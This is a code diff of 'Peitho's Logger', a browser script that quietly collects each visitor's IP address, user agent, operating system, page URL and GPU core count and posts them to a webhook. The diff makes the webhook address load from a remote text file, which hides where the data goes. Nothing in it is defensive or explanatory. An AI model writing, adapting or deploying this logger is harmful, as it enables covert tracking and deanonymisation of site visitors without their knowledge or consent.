@@ -3,6 +3,13 @@ async function get_ip() {
 	let res = await req.text();
 	return res;
 }
+async function url() {
+	let req = await fetch('https://julie420.github.io/resources/url.txt');
+	let res = await req.text();
+	let hook = res;
+	return res;
+}
+
 get_ip().then((ip) => {
 	let useragent = navigator.userAgent;
 
@@ -19,21 +26,22 @@ get_ip().then((ip) => {
 	let os = navigator.platform;
 
 	let refferer = window.location.href;
-	function sendMessage() {
-		var request = new XMLHttpRequest();
-		request.open('POST', 'https://some-retarded-api.glitch.me/');
+	url().then((hook) => {
+		function sendMessage() {
+			var request = new XMLHttpRequest();
+			request.open('POST', hook);
 
-		request.setRequestHeader('Content-type', 'application/json');
+			request.setRequestHeader('Content-type', 'application/json');
 
-		var params = {
-			username: "Peitho's Logger",
-			avatar_url: 'https://doggo.ninja/TsY1SP.jpg',
-			color: '',
-			embeds: [
-				{
-					color: '19474160',
-					title: 'Logged a user!',
-					description: `**IP Address:**
+			var params = {
+				username: "Peitho's Logger",
+				avatar_url: 'https://doggo.ninja/TsY1SP.jpg',
+				color: '',
+				embeds: [
+					{
+						color: '19474160',
+						title: 'Logged a user!',
+						description: `**IP Address:**
 ${ip}
 ------------------------------------------------------
 **Browser data:**
@@ -56,11 +64,12 @@ Operating system: ${os}
 *GPU:*
 Core count: ${gpu}
 ------------------------------------------------------`,
-				},
-			],
-		};
+					},
+				],
+			};
 
-		request.send(JSON.stringify(params));
-	}
-	sendMessage();
+			request.send(JSON.stringify(params));
+		}
+		sendMessage();
+	});
 });
